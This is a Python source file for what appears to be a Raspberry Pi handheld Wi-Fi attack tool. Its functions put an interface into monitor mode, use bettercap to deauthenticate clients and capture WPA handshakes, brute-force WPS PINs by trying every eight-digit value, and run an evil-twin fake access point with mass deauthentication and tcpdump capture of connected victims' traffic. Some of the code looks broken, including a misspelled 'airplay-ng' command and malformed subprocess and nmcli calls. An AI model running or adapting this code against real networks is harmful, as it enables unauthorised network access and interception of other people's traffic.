from lib.mojstd import *
import RPi.GPIO as GPIO
import os
import subprocess
import time


bk_ = 0

class netstd():
#NETWORK/INTERFACE MANAGEMENT
    def __init__(self, INTERFACE, selected_option=None, wps_pin=None):
        self.INTERFACE = INTERFACE
        self.bettercap_process = subprocess.Popen(
            ['sudo', 'bettercap', '-iface', f'{INTERFACE}'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )

    def run_result(self, selected_option, INTERFACE, wps_pin):
        result = subprocess.run(
                    ["nmcli", "dev", "wifi", "connect", selected_option, "infname", INTERFACE, "--wps-wps_pin", wps_pin],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
        return result


    def bk(self):
        if GPIO.input(KEY3_PIN) == 0:
            return True
        
    def key2(self):
        if GPIO.input(KEY2_PIN) == 0:
            return True

    def interface_select(self, INTERFACE):
        test = os.popen(f"iwconfig {self.INTERFACE} ")
        out = test.read()


        if "No such device" in out:
            return 1

        else:
            pass
            return 0

    def interface_start(self, INTERFACE):
        time.sleep(0.5)
        os.system(f"sudo ifconfig {INTERFACE} down")
        os.system(f"sudo airmon-ng start {INTERFACE}")
        os.system(f"sudo ifconfig {INTERFACE} up")
        os.system(f"sudo airmon-ng check {INTERFACE} && sudo airmon-ng check kill")

        if self.bk() == True:
            return 1
        else:
            return 0
        
    def interface_stop(self, INTERFACE):
        os.system(f"sudo ifconfig {INTERFACE} down")
        os.system(f"sudo airmon-ng stop {INTERFACE}")

        if self.bk() == True:
            return 1
        else:
            return 0
        
    def interface_start1(self, INTERFACE):
        time.sleep(0.5)
        os.system(f"sudo ifconfig {INTERFACE} down")
        os.system(f"sudo airmon-ng start {INTERFACE}")
        os.system(f"sudo ifconfig {INTERFACE} up")

        if self.bk() == True:
            return 1
        else:
            return 0 
        
#HANDSHAKE
    #HANDSHAKE CAPTURE
    def initialization(self, selected_chan, selected_option, selected_bssid, INTERFACE):
        bk_ = 0
        commands = [
            'wifi.recon on',
            'wifi.show',
            f'set wifi.recon channel {selected_chan}',
            'set net.sniff.verbose true',
            'set net.sniff.filter ether proto 0x888e',
            f'set net.sniff.output /home/kali/mojito/wpa_handshakes/wpa_{selected_option}_.pcap',
            'net.sniff on',
            f'wifi.deauth {selected_bssid}'
        ]

        messages = [
            "Starting Recon...",
            "Examining Networks...",
            "Setting Channel...",
            "Setting Verbose...",
            "Setting Filter...",
            "Setting Output...",
            "Starting Sniff...",
            "Deauthing..."
        ]

        self.__init__(self.INTERFACE)
        time.sleep(0.5)
        for i in commands:

            #key3
            if self.bk() == True:
                return 1

            time.sleep(4)
            ui_print(f"Loading ({commands.index(i)})", 0.5)
            self.bettercap_process.stdin.write(i+'\n')

            #key3
            if self.bk() == True:
                return 1

            self.bettercap_process.stdin.flush()
            ui_print(messages[commands.index(i)], 1)

            #Write output
            with open("/home/kali/mojito/logs/output.txt", 'a') as file:
                file.write(self.bettercap_process.stdout.readline())

        return 0
    


#WPS
    #WPS BRUTE FORCE
    def generate(self):
        for var in range(0, 100000000):
            yield f"{var:08d}"  

    def connect(self, selected_option, wps_pin, INTERFACE):
        try:
            result = self.run_result(selected_option, INTERFACE, wps_pin)

            if "successfully activated" in result.stdout.lower():
                ui_print(f"Connected'{selected_option}' \n PIN: {wps_pin}", 5)
                return 0
            else:
                ui_print(f"PIN {wps_pin} failed.")
                return 1
            
        except Exception as e:
            ui_print(f"Error {wps_pin}:\n {e}")
            with open("/home/kali/mojito/logs/output2.txt", 'a') as file:
                file.write(f"Error {wps_pin}:\n {e}")
            return 1

    def brute_force_wps(self, selected_option, INTERFACE):
        for wps_pin in self.generate():
            if self.connect(selected_option, wps_pin, INTERFACE) == 0:
                ui_print(f"PIN : {wps_pin}")
                break
            else:
                pass
            time.sleep(0.1)
        return 0

#FAKE AP
    #EVIL TWIN
    def evil_twin(self, INTERFACE, selected_option, selected_bssid, selected_chan):
        #os.system(f"sudo airmon-ng check kill")
        os.system(f"sudo airbase-ng -e {selected_option} -c {selected_chan} {INTERFACE}")
        commands = [
            "sudo ip link add name mojito_wlan type bridge",
            "sudo ip link set mojito_wlan up",
            #"sudo ip link set lo master mojito_wlan",
            "sudo ip link set at0 master mojito_wlan",
            "sudo dhclient mojito_wlan &",
            f"sudo airplay-ng --deauth 1000 -a {selected_bssid} {INTERFACE} --ignore-negative-one",
        ]
        print("Starting Evil Twin...")
        for i in commands:
            if self.bk() == True:
                return 1
            process = subprocess.Popen(i, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)
            with open("/home/kali/mojito/logs/evil_twin.log", 'a') as file:
                file.write(process.stdout.readline())
            time.sleep(0.5)
            print(i)

        process = subprocess.Popen(
            ['sudo', 'tcpdump', '-i', 'mojito_wlan', '-w', f'/home/kali/mojito/pcap/evil_twin_{selected_option}.pcap'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )
        print("Starting tcpdump...")
        with open("/home/kali/mojito/logs/evil_twin.log", 'a') as file:
            file.write(process.stdout.readline())
        
        while True:
            if self.bk() == True:
                subprocess.Popen.kill(process)
                return 1
                

    

        
